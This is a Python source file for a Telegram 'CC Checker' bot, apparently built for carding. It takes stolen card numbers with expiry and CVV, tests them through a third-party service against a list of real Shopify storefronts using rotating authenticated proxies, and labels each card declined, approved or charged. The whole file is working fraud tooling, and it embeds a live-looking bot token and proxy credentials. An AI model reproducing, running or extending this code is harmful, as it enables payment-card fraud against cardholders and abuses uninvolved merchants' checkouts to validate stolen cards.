import re
import time
import requests
import telebot
from typing import List
import threading
import random

# ===================== CONFIG =====================
BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"
shop_urls = [
    "https://52a07b-2.myshopify.com",
    "https://6sbibg-yh.myshopify.com",
    "https://7pxptt-gn.myshopify.com",
    "https://7zzbrn-ch.myshopify.com",
    "https://a5qrze-bz.myshopify.com",
    "https://ajs-55743.myshopify.com",
    "https://ajvv.myshopify.com",
    "https://ak24pz-na.myshopify.com",
    "https://al-furqans-perfumes-and-beauty.myshopify.com",
    "https://allthingsbykeisha.myshopify.com",
    "https://amneue.myshopify.com",
    "https://animolds.myshopify.com",
    "https://anjoly30-boutique.myshopify.com",
    "https://antarctic-press.myshopify.com",
    "https://apexmarket-store.myshopify.com",
    "https://apkbridal.myshopify.com",
    "https://boldwritst-store.myshopify.com",
    "https://brand-x-electrical.myshopify.com",
    "https://brandalees-bargains.myshopify.com",
    "https://burlap-kitchen.myshopify.com",
]

# ===================== PROXY CONFIG =====================
proxy_list = [
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.58.2:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.2.42:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.60.148:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.170.138:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.49.59:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.228:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.40:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.5.31:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.38.238:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.33.161:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.166.226:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.225.61:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.249.212:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.0.216:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@65.111.15.217:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@45.3.62.100:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@216.26.252.209:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.40.131:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@104.207.59.223:3129",
    "7mvqt1wy6i1o:7jt5zr3c0ix1s0o@209.50.185.169:3129",
]

bot = telebot.TeleBot(BOT_TOKEN)
user_check_in_progress = {}
last_check_time = {}

# ===================== UTILITY FUNCTIONS =====================
def is_valid_card(card: str) -> bool:
    parts = card.split('|')
    if len(parts) != 4:
        return False
    cc, mm, yy, cvv = parts
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return False
    if not mm.isdigit() or len(mm) != 2:
        return False
    if not yy.isdigit() or len(yy) not in [2, 4]:
        return False
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        return False
    return True

def esc(t):
    return str(t).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def bin_lookup(bin_code):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "bank": data.get("bank", "N/A"),
                "country": data.get("country_name", "N/A"),
                "country_emoji": data.get("country_flag", "🏳️")
            }
    except:
        pass
    return {
        "brand": "N/A",
        "type": "N/A",
        "level": "N/A",
        "bank": "N/A",
        "country": "N/A",
        "country_emoji": "🏳️"
    }

def format_result(card, api_json, user, user_id, elapsed):
    gateway = api_json.get("Gateway", "Shopify Normal")
    status = api_json.get("Status", api_json.get("status", "Unknown"))
    response_msg = api_json.get("Response", api_json.get("response", ""))
    amount_raw = (
        api_json.get("Amount")
        or api_json.get("amount")
        or api_json.get("price")
        or api_json.get("Price")
    )
    try:
        amount_value = float(str(amount_raw).replace("$", "").strip())
        amount = f"${amount_value:.2f}"
    except:
        amount = "N/A"
    bin_code = card.split('|')[0][:6]
    bininfo = bin_lookup(bin_code)

    status_lower = str(status).lower()
    response_lower = str(response_msg).lower()
    declined_phrases = [
        "declined", "card_declined", "authorization_error", "authentication_failed",
        "do_not_honor", "pick_up_card", "pickup_card", "stolen_card", "lost_card", "incorrect_number",
        "expired_card", "processing_error", "fraudulent", "generic_error",
        "fraud_suspected", "invalid_payment_error", "amount_too_small"
    ]
    if any(x in status_lower or x in response_lower for x in declined_phrases):
        status_str = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "3d", "authentication", "3d secure", "OTP_REQUIRED", "3ds", "otp", "verify", "verification"
    ]):
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif "insufficient" in response_lower or "low funds" in response_lower:
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif "incorrect_zip" in response_lower:
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "incorrect cvc", "invalid cvc", "incorrect cvv", "incorrect_cvc", "INSUFFICIENT_FUNDS", "invalid cvv", "incorrect security code", "invalid security code"
    ]):
        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "thank you", "order placed", "charged", "⤿ORDER_PAID⤾", "successfully paid", "payment successful"
    ]):
        status_str = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 💎"
        response_show = response_msg
    else:
        approved_phrases = ["approved", "charged", "success", "live", "approved!"]
        is_approved = any(p in status_lower for p in approved_phrases)
        status_str = f"{esc(status)} {'✅' if is_approved else '❌'}"
        response_show = response_msg

    link = "https://t.me/NIKSHACKS"
    b = lambda t: f"<b>{t}</b>"
    m = lambda t: f"<code>{t}</code>"
    ks = f'<a href="{link}">ϟ</a>'
    su = f'<a href="{link}">ス</a>'
    curl = f'<a href="{link}">⌯</a>'

    text = (
    f"{b('#Shopi | Luffy [/sh]')}\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{ks}] Card:')} {m(card)}\n"
    f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
    f"{b(f'[{ks}] Status:')} {m(esc(status_str))}\n"
    f"{b(f'[{ks}] Response:')} {m(esc(response_show))}\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
    f"{b(f'[{curl}] Info:')} {m(bininfo['brand'] + ' - ' + bininfo['type'] + ' - ' + bininfo['level'])}\n"
    f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
    f"{b(f'[{curl}] Country:')} {m(bininfo['country'] + ' - ' + bininfo['country_emoji'])}\n"
    f"━━━━━━━━━━━━━\n"
    f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
    f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - ☘️</a>\n"
    f"━━━━━━━━━━━━━\n"
    f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live 🌥]')}"
)
    return text

def extract_cards_from_text(text: str) -> List[str]:
    """Extract cards with robust regex patterns."""
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b',
        r'\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{4})-(\d{4})-(\d{4})-(\d{4})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
        r'^(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                cc, mm, yy, cvv = match
                mm = mm.zfill(2)
                if len(yy) == 4: yy = yy[2:]
                card_string = f"{cc}|{mm}|{yy}|{cvv}"
                if card_string not in cards: cards.append(card_string)
    return cards

# ===================== BOT COMMAND HANDLERS =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
def check_card(message):
    uid = str(message.from_user.id)
    username = (message.from_user.username or "").lower()

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
        return

    now = time.time()
    last_end = last_check_time.get(uid, 0)
    cooldown = 0
    if now - last_end < cooldown:
        wait_sec = int(cooldown - (now - last_end))
        bot.reply_to(message, f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
        return

    user_check_in_progress[uid] = True

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ꜱʜ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
        user_check_in_progress[uid] = False
        return
    card = args[1].replace(" ", "")
    if not is_valid_card(card):
        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        user_check_in_progress[uid] = False
        return

    status_msg = bot.reply_to(message, "ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
    t0 = time.time()
    
    def process_check():
        try:
            shop_url = random.choice(shop_urls)
            proxy = random.choice(proxy_list)
            
            api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy}"
            
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(api_url, timeout=60, proxies=proxies)
            
            try:
                api_json = response.json()
            except Exception:
                api_json = {"Response": response.text}
            
            elapsed = time.time() - t0
            user_display = message.from_user.username or message.from_user.first_name
            result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
            
            bot.edit_message_text(result_text, chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode='HTML')
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {str(e)}", chat_id=status_msg.chat.id, message_id=status_msg.message_id)
        finally:
            user_check_in_progress[uid] = False
            last_check_time[uid] = time.time()
    
    threading.Thread(target=process_check, daemon=True).start()

# ===================== BOT POLLING =====================
if __name__ == "__main__":
    print("Bot started...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
